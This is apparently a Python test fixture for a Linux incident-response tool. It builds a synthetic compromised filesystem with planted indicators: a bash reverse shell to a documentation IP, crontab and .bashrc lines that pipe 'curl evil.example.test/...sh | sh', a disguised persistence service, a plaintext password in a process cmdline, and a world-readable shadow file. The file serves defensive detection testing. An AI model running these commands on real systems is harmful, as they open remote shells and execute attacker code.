"""Builds a synthetic fake root filesystem + fake command runner for deterministic tests/demos.

Everything here is invented test data: documentation-range IPs (RFC 5737), *.example.test domains,
and a harmless text file standing in for a "malicious binary".
"""

from __future__ import annotations

import hashlib
import ipaddress
import os
import socket
import struct
from datetime import UTC, datetime
from pathlib import Path

from linux_ir.utils.run import CommandResult

NOW = datetime(2026, 3, 10, 12, 0, 0, tzinfo=UTC)
FIXED_MTIME = 1_772_000_000  # 2026-02-25
FAKE_BINARY = b"SYNTHETIC TEST FILE - NOT A REAL BINARY - safe to delete\n"
FAKE_BINARY_SHA256 = hashlib.sha256(FAKE_BINARY).hexdigest()

SS_OUTPUT = """\
tcp   LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=412,fd=3))
tcp   LISTEN 0 5 0.0.0.0:4444 0.0.0.0:* users:(("kworker-upd",pid=977,fd=3))
tcp   ESTAB  0 0 10.0.0.5:51234 203.0.113.50:443 users:(("kworker-upd",pid=977,fd=4))
udp   UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* users:(("resolved",pid=300,fd=13))
"""
OUTPUTS = {
    ("ss", "-H", "-tunap"): SS_OUTPUT,
    ("ip", "-o", "addr"): "2: eth0    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth0\n",
    ("ip", "route"): "default via 10.0.0.1 dev eth0 proto dhcp metric 100\n10.0.0.0/24 dev eth0 src 10.0.0.5\n",
    ("who",): "analyst  pts/0  2026-03-10 11:30 (198.51.100.77)\n",
}


def fake_runner(argv: list[str], timeout: float, max_bytes: int) -> CommandResult:
    key = tuple(argv)
    if key in OUTPUTS:
        return CommandResult(argv=list(argv), returncode=0, stdout=OUTPUTS[key])
    return CommandResult(argv=list(argv), error_kind="not_found", error=f"{argv[0]}: command not found (synthetic)")


def _w(root: Path, rel: str, text: str | bytes, mode: int = 0o644) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(text.encode() if isinstance(text, str) else text)
    p.chmod(mode)
    return p


def _hexaddr(ip: str) -> str:
    return struct.pack("<I", int(ipaddress.IPv4Address(ip))).hex().upper()


def _net_row(i: int, lip: str, lport: int, rip: str, rport: int, state: str) -> str:
    return (
        f"  {i}: {_hexaddr(lip)}:{lport:04X} {_hexaddr(rip)}:{rport:04X} {state} 00000000:00000000 "
        f"00:00000000 00000000  1000        0 {10000 + i} 1 0000000000000000 100 0 0 10 0"
    )


def _proc(
    root: Path, pid: int, comm: str, ppid: int, uid: int, cmdline: list[str], exe: str | None, start_ticks: int = 1000
) -> None:
    d = root / "proc" / str(pid)
    d.mkdir(parents=True, exist_ok=True)
    fields = ["S", str(ppid)] + ["0"] * 17 + [str(start_ticks)] + ["0"] * 10
    (d / "stat").write_text(f"{pid} ({comm}) " + " ".join(fields) + "\n")
    (d / "status").write_text(f"Name:\t{comm}\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\nGid:\t{uid}\t{uid}\t{uid}\t{uid}\n")
    (d / "cmdline").write_bytes(b"\x00".join(a.encode() for a in cmdline) + (b"\x00" if cmdline else b""))
    if exe:
        os.symlink(exe, d / "exe")


def build_rootfs(root: Path) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    _w(
        root,
        "etc/os-release",
        'NAME="Ubuntu"\nVERSION_ID="22.04"\nID=ubuntu\nPRETTY_NAME="Ubuntu 22.04.4 LTS (synthetic)"\n',
    )
    _w(root, "proc/uptime", "86400.50 80000.00\n")
    _w(root, "proc/stat", "cpu  1 2 3 4\nbtime 1772900000\n")
    _w(root, "proc/sys/kernel/hostname", "synthetic-host\n")
    _w(root, "proc/sys/kernel/randomize_va_space", "2\n")
    _w(root, "proc/1/comm", "systemd\n")
    _w(root, "run/systemd/system/.keep", "")
    _w(
        root,
        "proc/self/mounts",
        "/dev/sda1 / ext4 rw,relatime 0 0\ntmpfs /tmp tmpfs rw,nosuid 0 0\nproc /proc proc rw 0 0\n",
    )
    _w(root, "proc/modules", "nf_tables 262144 0 - Live 0x0\nsynthetic_mod 16384 1 - Live 0x0\n")
    rows = [
        _net_row(0, "0.0.0.0", 22, "0.0.0.0", 0, "0A"),
        _net_row(1, "0.0.0.0", 4444, "0.0.0.0", 0, "0A"),
        _net_row(2, "10.0.0.5", 51234, "203.0.113.50", 443, "01"),
    ]
    _w(
        root,
        "proc/net/tcp",
        "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
        + "\n".join(rows)
        + "\n",
    )
    _w(root, "proc/net/udp", "  sl  local_address rem_address   st\n")
    # executables on the fake filesystem
    for exe in ("usr/lib/systemd/systemd", "usr/sbin/sshd", "usr/bin/bash"):
        _w(root, exe, f"synthetic {exe}\n", 0o755)
    _w(root, "tmp/.cache/kworker-upd", FAKE_BINARY, 0o755)
    _proc(root, 1, "systemd", 0, 0, ["/sbin/init"], "/usr/lib/systemd/systemd", 10)
    _proc(root, 412, "sshd", 1, 0, ["/usr/sbin/sshd", "-D"], "/usr/sbin/sshd", 50)
    _proc(root, 977, "kworker-upd", 1, 1000, ["/tmp/.cache/kworker-upd", "--daemon"], "/tmp/.cache/kworker-upd", 600000)
    _proc(root, 1203, "oldsvc", 1, 0, ["/usr/bin/oldsvc"], "/usr/bin/oldsvc (deleted)", 700000)
    _proc(
        root,
        1310,
        "mysql",
        412,
        1000,
        ["mysql", "--user=app", "--password=hunter2-synthetic", "-h", "db.example.test"],
        "/usr/bin/bash",
        710000,
    )
    _proc(
        root,
        1400,
        "bash",
        412,
        1000,
        ["bash", "-c", "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"],
        "/usr/bin/bash",
        720000,
    )
    # systemd
    _w(
        root,
        "etc/systemd/system/evil-updater.service",
        "[Unit]\nDescription=System Update Helper\n[Service]\nExecStart=/tmp/.cache/kworker-upd --daemon\nRestart=always\n"
        "[Install]\nWantedBy=multi-user.target\n",
    )
    _w(
        root,
        "etc/systemd/system/backup.service",
        "[Unit]\nDescription=Nightly backup\n[Service]\nExecStart=/usr/local/bin/missing-backup.sh\n[Install]\nWantedBy=multi-user.target\n",
    )
    _w(
        root,
        "etc/systemd/system/ssh.service",
        "[Unit]\nDescription=OpenBSD Secure Shell server\n[Service]\nExecStart=/usr/sbin/sshd -D\n[Install]\nWantedBy=multi-user.target\n",
    )
    (root / "etc/systemd/system/multi-user.target.wants").mkdir(parents=True, exist_ok=True)
    os.symlink(
        "/etc/systemd/system/evil-updater.service",
        root / "etc/systemd/system/multi-user.target.wants/evil-updater.service",
    )
    # cron
    _w(
        root,
        "etc/crontab",
        "SHELL=/bin/sh\nMAILTO=root\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
        "*/5 * * * * root curl -s http://evil.example.test/p.sh | sh\n",
    )
    _w(root, "etc/cron.d/cleanup", "0 3 * * * root /usr/sbin/sshd -t\n")
    # user home
    _w(
        root,
        "home/analyst/.bashrc",
        "# synthetic\nexport EDITOR=vim\nalias ll='ls -l'\ncurl http://evil.example.test/x.sh | sh\n",
    )
    _w(
        root,
        "home/analyst/.ssh/authorized_keys",
        'command="/bin/true" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl synthetic-comment\n',
        0o600,
    )
    _w(root, "etc/ssh/sshd_config", "Port 22\nPermitEmptyPasswords yes\nPasswordAuthentication yes\n")
    # sensitive files
    _w(root, "etc/passwd", "root:x:0:0:root:/root:/bin/bash\nanalyst:x:1000:1000::/home/analyst:/bin/bash\n")
    _w(root, "etc/shadow", "root:*:19000:0:99999:7:::\n", 0o644)  # world-readable on purpose (synthetic finding)
    _w(root, "etc/ld.so.preload", "/usr/lib/libsynthetic-hook.so\n")
    # auth log (classic syslog format; year inferred from reference time, zone assumed UTC)
    lines = []
    for i in range(12):
        lines.append(
            f"Mar 10 11:{40 + i // 2:02d}:{(i * 7) % 60:02d} synthetic-host sshd[2{i:03d}]: "
            f"Failed password for invalid user admin from 203.0.113.50 port {40000 + i} ssh2"
        )
    lines += [
        "Mar 10 11:50:30 synthetic-host sshd[2900]: Accepted password for root from 203.0.113.50 port 40100 ssh2",
        "Mar 10 11:51:00 synthetic-host sshd[2901]: Invalid user test from 198.51.100.77",
        "Mar 10 11:55:01 synthetic-host sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/id",
        "this line is malformed and must be skipped",
        "Jan  1 00:00:01 synthetic-host sshd[1]: Failed password for root from 192.0.2.9 port 1 ssh2",
    ]
    for i in range(3):
        lines.append(
            f"Mar 10 11:56:{i * 10:02d} synthetic-host sudo: pam_unix(sudo:auth): authentication failure; "
            f"logname=analyst uid=1000 euid=0 tty=/dev/pts/0 ruser=analyst rhost=  user=analyst"
        )
    _w(root, "var/log/auth.log", "\n".join(lines) + "\n", 0o640)
    for p in root.rglob("*"):
        if not p.is_symlink():
            os.utime(p, (FIXED_MTIME, FIXED_MTIME))
    return root


__all__ = ["build_rootfs", "fake_runner", "NOW", "FAKE_BINARY_SHA256", "socket"]
